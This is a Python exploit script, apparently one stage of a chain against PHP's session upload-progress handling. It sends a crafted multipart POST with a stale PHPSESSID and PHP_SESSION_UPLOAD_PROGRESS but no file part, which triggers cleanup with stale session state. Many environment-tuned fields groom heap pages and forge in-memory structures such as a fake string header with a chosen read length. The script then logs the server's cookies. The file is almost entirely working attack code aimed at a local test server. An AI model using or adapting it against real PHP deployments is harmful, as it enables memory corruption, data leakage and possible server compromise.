#!/usr/bin/env python3
"""B trigger for the no-display_errors chain: pre-RINIT END cleanup with a stale PS(id).

usage: send_b_open.py N VL
  N  : regular fields with VL-byte values (short numeric names); bin-256 runs
       (VL=231) fill the low pages of the main chunk so that the stale
       PS(mod_data) page (+0x62000) becomes an SRUN page in this request.
  VL : value length (default 231)
Then PHPSESSID (non-empty) + PHP_SESSION_UPLOAD_PROGRESS, and NO file part, so
MULTIPART_EVENT_END -> php_session_rfc1867_cleanup() -> php_session_initialize()
runs with the stale PS(id) and PS(send_cookie)=1 left by A.
"""
import os
import socket
import sys

N = int(sys.argv[1]) if len(sys.argv) > 1 else 900
VL = int(sys.argv[2]) if len(sys.argv) > 2 else 231
BUNIQ = int(os.environ.get('BUNIQ', '0'))
DUP_IDX = int(os.environ.get('DUP_IDX', '-1'), 0)
DUP_LEN = int(os.environ.get('DUP_LEN', '1'))
BLATE = int(os.environ.get('BLATE', '0'))
BTAILPAD = int(os.environ.get('BTAILPAD', '0'))
BVAL_OFF = int(os.environ.get('BVAL_OFF', '0'), 0)
BVAL_LEN = int(os.environ.get('BVAL_LEN', '0'), 0)
NEST_N = int(os.environ.get('NEST_N', '0'))
NEST_E = int(os.environ.get('NEST_E', '0'))
NEST_VL = int(os.environ.get('NEST_VL', '1'))
TAIL231_N = int(os.environ.get('TAIL231_N', '0'))
TAIL232_N = int(os.environ.get('TAIL232_N', '0'))
TAIL232_SAFE = int(os.environ.get('TAIL232_SAFE', '1'))
NEST_FIRST = int(os.environ.get('NEST_FIRST', '0'))
NEST_LONGNAME = int(os.environ.get('NEST_LONGNAME', '0'))
P511 = int(os.environ.get('P511', '0'))
FREE128_N = int(os.environ.get('FREE128_N', '0'))
PRE_N = int(os.environ.get('PRE_N', '0'))
PRE_E = int(os.environ.get('PRE_E', '1'))
PRE_VL = int(os.environ.get('PRE_VL', '3000'))
FILL_N = int(os.environ.get('FILL_N', '0'))
FILL_VL = int(os.environ.get('FILL_VL', '3000'))
P511_TINY_VL = int(os.environ.get('P511_TINY_VL', '0'))
TGT_N = int(os.environ.get('TGT_N', '0'))
TGT_E = int(os.environ.get('TGT_E', '17'))
TGT_VL = int(os.environ.get('TGT_VL', '1'))
COOK_N = int(os.environ.get('BCOOK_N', '0'))
COOK_LEN = int(os.environ.get('BCOOK_LEN', '200'))
BQ_N = int(os.environ.get('BQ_N', '0'))
BQ_LEN = int(os.environ.get('BQ_LEN', '200'))
BPAD_N = int(os.environ.get('BPAD_N', '0'))
BPAD_LEN = int(os.environ.get('BPAD_LEN', '400'))
BB_LEN = int(os.environ.get('BB_LEN', '0'))
FORGE_LEN = int(os.environ.get('FORGE_LEN', '0'))
FORGE_READ = int(os.environ.get('FORGE_READ', '0'), 0)
assert N + 2 + (1 if BB_LEN else 0) <= 1000, "too many vars"

BND = b'B' * 10
def _mkval(i):
    if BUNIQ:
        v = bytearray(('v%04d' % i).encode().ljust(VL, b'x'))
    else:
        v = bytearray(b'V' * VL)
    if BVAL_OFF > 0 and BVAL_OFF + 8 <= len(v):
        import struct
        struct.pack_into('<Q', v, BVAL_OFF, BVAL_LEN)
    return bytes(v)

def _nest_parts():
    out = []
    for _i in range(NEST_N):
        nm = (('a' * 13 + '%02d' % _i) if NEST_LONGNAME else ('a%d' % _i))
        for _j in range(NEST_E):
            out.append(('%s[%d]' % (nm, _j), b'n' * NEST_VL))
    return out

parts = []
if NEST_FIRST:
    parts.extend(_nest_parts())
for i in range(N):
    parts.append((str(1000 + i), _mkval(i)))
if P511:
    for _i in range(FREE128_N):
        parts.append(('15%03d' % _i, b'F' * 110))
    for _i in range(PRE_N):
        nm = str(2000 + _i)
        for _j in range(PRE_E):
            parts.append(('%s[%d]' % (nm, _j), b'p' * PRE_VL))
    p511_bb1 = int(os.environ.get('P511_BB1', '0'))
    if p511_bb1 > 0:
        parts.append(('900001', b'P' * p511_bb1))
    p511_bfp1 = int(os.environ.get('P511_BF_P1', '0'))
    if p511_bfp1 > 0:
        D = (510 - p511_bfp1) * 4096
        parts.append(('900002', b'Q' * D))
    for _i in range(FILL_N):
        parts.append(('16%03d' % _i, b'f' * FILL_VL))
    if P511_TINY_VL > 0:
        parts.append(('900003', b'T' * P511_TINY_VL))
    for _i in range(TGT_N):
        nm = str(3000 + _i)
        for _j in range(TGT_E):
            parts.append(('%s[%d]' % (nm, _j), b'n' * TGT_VL))
if not NEST_FIRST:
    parts.extend(_nest_parts())
for _i in range(TAIL231_N):
    parts.append(('t%d' % _i, b'T' * 231))
for _i in range(TAIL232_N):
    import struct
    tb = bytearray(b'T' * 232)
    if TAIL232_SAFE:
        struct.pack_into('<Q', tb, 8, 0)   # ps_files.last_key
        struct.pack_into('<Q', tb, 16, 0)  # ps_files.basedir
    parts.append(('u%d' % _i, bytes(tb)))
if BLATE:
    parts.append(('PHPSESSID', b'attacksessionid0001'))
    parts.append(('PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))
    if BTAILPAD:
        parts.append(('999995', b'P' * BTAILPAD))
if DUP_IDX >= 0:
    parts.append((str(1000 + DUP_IDX), b'D' * DUP_LEN))
if FORGE_LEN > 0:
    import struct
    fb = bytearray(b'F' * FORGE_LEN)
    struct.pack_into('<Q', fb, 16, FORGE_READ)
    parts.append(('999996', bytes(fb)))
if BB_LEN > 0:
    if os.environ.get('BB_PAT', '0') == '1':
        import struct
        nw = BB_LEN // 8
        buf = b''.join(struct.pack('<Q', 0x4141414100000000 + i)
                       for i in range(nw))
        buf += b'W' * (BB_LEN - len(buf))
        parts.append(('900000', buf))
    else:
        parts.append(('900000', b'W' * BB_LEN))
BB1_LEN = int(os.environ.get('BB1_LEN', '0'))
if BB1_LEN > 0:
    # packing copy: allocation is exactly BB1_PAGES pages
    parts.append(('900001', b'P' * BB1_LEN))
BF_P1 = int(os.environ.get('BF_P1', '0'))
if BF_P1 > 0:
    import struct
    D = (510 - BF_P1) * 4096
    R = int(os.environ.get('BF_READ', '4000'))
    L2 = D + 1000
    buf = bytearray(b'Q' * L2)
    struct.pack_into('<Q', buf, D - 24, 0x4141414141414141)  # gc
    struct.pack_into('<Q', buf, D - 16, 0)                    # h
    struct.pack_into('<Q', buf, D - 8, R)                     # len
    buf[D:] = b'M' * (L2 - D)
    parts.append(('900002', bytes(buf)))
if not BLATE:
    parts.append(('PHPSESSID', b'attacksessionid0001'))
    parts.append(('PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))

o = bytearray()
for name, data in parts:
    o += b'--' + BND + b'\r\n'
    o += b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
    o += data + b'\r\n'
o += b'--' + BND + b'--\r\n'
path = '/index.php'
if BQ_N > 0:
    qpairs = []
    for i in range(BQ_N):
        qpairs.append(('q%03d' % i) + '=' + ('Q' * BQ_LEN))
    path = '/index.php?' + '&'.join(qpairs)
cookie_hdr = b''
if COOK_N > 0:
    pairs = []
    for i in range(COOK_N):
        pairs.append(('c%03d' % i).encode() + b'=' + (b'C' * COOK_LEN))
    cookie_hdr = b'Cookie: ' + b'; '.join(pairs) + b'\r\n'
pad_hdr = b''
for i in range(BPAD_N):
    pad_hdr += ('X-Pad%03d: ' % i).encode() + (b'P' * BPAD_LEN) + b'\r\n'
req = (('POST %s HTTP/1.1\r\n'
        'Host: 127.0.0.1:8088\r\n'
        'Content-Type: multipart/form-data; boundary=%s\r\n'
        'Content-Length: %d\r\n'
        'Connection: close\r\n\r\n') % (path, BND.decode(), len(o))).encode()
req = req.replace(b'\r\n\r\n', b'\r\n' + pad_hdr + cookie_hdr + b'\r\n', 1)
s = socket.create_connection(('127.0.0.1', 8088), timeout=60)
s.settimeout(60)
resp = b''
try:
    s.sendall(req + bytes(o))
    while len(resp) < 2000000:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except OSError:
    pass
s.close()
open('/tmp/b_open.resp', 'wb').write(resp)
print('RESP_LEN', len(resp))
head = resp.split(b'\r\n\r\n', 1)[0]
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE', line[:200].decode('latin1', 'replace'))
print('HEAD', head[:300].decode('latin1', 'replace').replace('\r\n', ' | '))
